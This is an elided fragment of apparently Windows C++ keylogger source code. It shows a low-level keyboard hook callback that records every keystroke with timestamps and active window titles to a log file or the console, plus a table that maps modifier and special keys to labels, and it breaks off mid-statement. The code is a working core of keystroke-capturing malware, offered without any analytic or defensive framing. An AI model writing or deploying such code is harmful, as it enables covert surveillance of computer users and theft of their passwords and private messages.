...
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        ...
        if (strncmp(name, last_name, MY_MAX_PATH) != 0) {
            ...
            char timebuf[32];
            strftime(timebuf, sizeof(timebuf), "%m.%d.%Y %H:%M:%S", &tstruct);
            std::string header = std::string("[") + timebuf + "] [" + last_name + "]\n";
            if (!firstWindow) {
                header = "\n" + header;
            }
            firstWindow = false;
        ...
        if (result > 0) {
            char utf8buf[8] = {0};
            int len = WideCharToMultiByte(CP_UTF8, 0, wbuf, 1, utf8buf, 8, NULL, NULL);
            if (len > 0) {
                if (logToFile == true) {
                    myfile << std::string(utf8buf, len);
                }
                if (logToConsole == true) {
                    std::cout << std::string(utf8buf, len);
                }
            }
        } else {
            ...
            if (ch) {
                ...
                switch (p->vkCode) {
                    ...
                    case VK_LSHIFT:      keyStr = "[LShift]"; break;
                    case VK_RSHIFT:      keyStr = "[RShift]"; break;
                    case VK_CONTROL:     keyStr = "[Ctrl]"; break;
                    case VK_LCONTROL:    keyStr = "[LCtrl]"; break;
                    case VK_RCONTROL:    keyStr = "[RCtrl]"; break;
                    case VK_MENU:        keyStr = "[Alt]"; break;
                    case VK_LMENU:       keyStr = "[LAlt]"; break;
                    case VK_RMENU:       keyStr = "[RAlt]"; break;
                    ...
                    case VK_SNAPSHOT:    keyStr = "[PrtScr]"; break;
                    ...
                    case VK_LWIN:        keyStr = "[LWin]"; break;
                    case VK_RWIN:        keyStr = "[RWin]"; break;
                    case VK_APPS:        keyStr = "[Apps]"; break;
                    ...
                    case VK_OEM_102:     keyStr = "[OEM_102]"; break;
                    default: break;
                }
                if (!keyStr.empty()) {
                    if (logToFile == true) {
